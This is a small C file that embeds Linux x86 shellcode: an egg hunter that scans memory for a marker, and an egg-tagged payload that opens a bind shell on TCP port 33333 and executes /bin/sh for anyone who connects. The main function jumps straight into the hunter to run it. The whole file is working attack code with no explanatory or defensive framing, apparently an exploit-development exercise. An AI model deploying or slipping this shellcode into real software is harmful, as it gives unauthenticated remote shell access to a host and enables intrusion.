#include <stdio.h>
#include <string.h>

#define EGG	"\x90\x50\x90\x50"

unsigned char egghunter[] = \
"\x66\x81\xc9\xff\x0f"  // or     cx,0xfff
"\x41"                  // inc    ecx
"\x6a\x43"              // push   0x43
"\x58"                  // pop    eax
"\xcd\x80"              // int    0x80
"\x3c\xf2"              // cmp    al,0xf2
"\x74\xf1"              // je     align_page
"\xb8" 
EGG                     // mov    eax,0x50905090
"\x89\xcf"              // mov    edi,ecx
"\xaf"                  // scas   eax,DWORD PTR es:[edi]
"\x75\xec"              // jne    next_address
"\xaf"                  // scas   eax,DWORD PTR es:[edi]
"\x75\xe9"              // jne    next_address
"\xff\xe7";             // jmp    edi

unsigned char code[] = \
EGG
EGG
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
"\xb0\x66\x43\x52\x66\x68\x82\x35\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1"
"\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52"
"\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x92"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50"
"\x89\xe2\xb0\x0b\xcd\x80";

int main(void) {
    printf("Shellcode ength + 8 byte egg:  %d\n", strlen(code));
    printf("Egg hunter length: %d\n", strlen(egghunter));
    int (*ret)() = (int(*)())egghunter;
    ret();
}